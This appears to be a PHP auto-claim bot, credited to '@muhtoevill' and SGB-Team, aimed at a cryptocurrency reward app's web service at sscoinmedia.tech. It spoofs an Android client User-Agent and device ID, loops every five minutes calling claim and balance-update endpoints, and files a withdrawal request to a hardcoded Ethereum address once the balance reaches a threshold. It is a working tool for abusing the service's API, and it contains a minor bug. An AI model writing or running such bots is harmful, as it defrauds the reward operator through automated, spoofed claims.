<?php
error_reporting(0);
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,($str[1]));
	return $str[0];
}
function login($email,$name,$devid){
	$arr = array("\r","	");
	$url = "http://sscoinmedia.tech/EthereumWebService/ethereumUserAdd.php";
	$h = explode("\n",str_replace($arr,"","User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo 1606 Build/MMB29M)"));
	$body = "name=$name&email=$email&devid=$devid&";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$x = curl_exec($ch);
	curl_close($ch);
  return json_decode($x,true);
}
function updatedevice($email,$name,$devid){
	$arr = array("\r","	");
	$url = "http://sscoinmedia.tech/EthereumWebService/ethereumUpdateDeviceId.php";
	$h = explode("\n",str_replace($arr,"","User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo 1606 Build/MMB29M)"));
	$body = "name=$name&email=$email&devid=$devid&";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$x = curl_exec($ch);
	curl_close($ch);
  return json_decode($x,true);
}
function withdraw($email){
	$arr = array("\r","	");
	$url = "http://sscoinmedia.tech/EthereumWebService/ethereumAddrequest.php";
	$h = explode("\n",str_replace($arr,"","User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo 1606 Build/MMB29M)"));
	$body = "email=$email&etheaddress=0x6b9F71Caf88711aA20b1434a8B8e7D22B4ED3031&reqamt=1600000&fees=0&paymethod=ETH Address&coinbaseemail=&";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$x = curl_exec($ch);
	curl_close($ch);
  return json_decode($x,true);
}
function timer($email,$devid){
	$arr = array("\r","	");
	$url = "http://sscoinmedia.tech/EthereumWebService/ethereumClaimTimer1.php";
	$h = explode("\n",str_replace($arr,"","User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo 1606 Build/MMB29M)"));
	$body = "email=$email&devid=$devid&";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$x = curl_exec($ch);
	curl_close($ch);
	return claim($email,$devid);
}
function claim($email,$devid){
	$arr = array("\r","	");
	$url = "http://sscoinmedia.tech/EthereumWebService/ethereumBalanceUpdate1.php";
	$h = explode("\n",str_replace($arr,"","User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo 1606 Build/MMB29M)"));
	$body = "email=$email&devid=$devid&claimok=ok";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$x = curl_exec($ch);
	curl_close($ch);
	return json_decode($x,true);
}
echo "#################\n#  @muhtoevill  #\n#   SGB-Team    #\n#  Binary-Team  #\n#################\n";
echo "email :";
$email = trim(fgets(STDIN));
echo "devid(Note Simpan devid nya untuk login lagi!!) :";
$devid = trim(fgets(STDIN));
echo "name :";
$name = trim(fgets(STDIN));
system('clear');
$wd = "1600000";
$datauser =  login($email,$name,$devid);
$output = json_encode($datauser);
if(strpos($output,"Found!!")==true){
    $update = updatedevice($email,$name,$devid);
    $balance = getStr($login,'"ubal":','}');
    echo "Berhasil update device + Login";
  }else{
    system('clear');
    echo "Berhasil Login ";
}
$balance = getStr($output,'"ubal":','}');
echo "Balance eth Anda adalah : ".$balance."\n";
while(TRUE){
if($balance>=$wd){
    $withdrawl = withdraw($email);
    $text = "Berhasil Withdrawl Amaount Yang Di Withdrawl adalah 1500000";
    $text1 = "\033[32m".$text."\033[0m";
    echo $text1;
}else{
      $claim = timer($email,$devid);
      $output = json_encode($claim);
      $balance = getStr($output,'"ubal":',',');
  	  $claim = getStr($output,'"claimamt":',',');
      if(strpos($output,"devid")==true){
              $text = " Berhasil Email: $email devid: $devid  Balance: $balance Claim: $claim Credit By:Muhtoevill Delay 5 menit";
              $text1 = "\033[32m".$text."\033[0m"; 
       }else{
              $text =" GAGAL";
              $text1 = "\033[31m".$text."\033[0m";
       }
    }
  echo date('d-m-Y H:i:s');
	echo $text1."\n";
	sleep(300);
}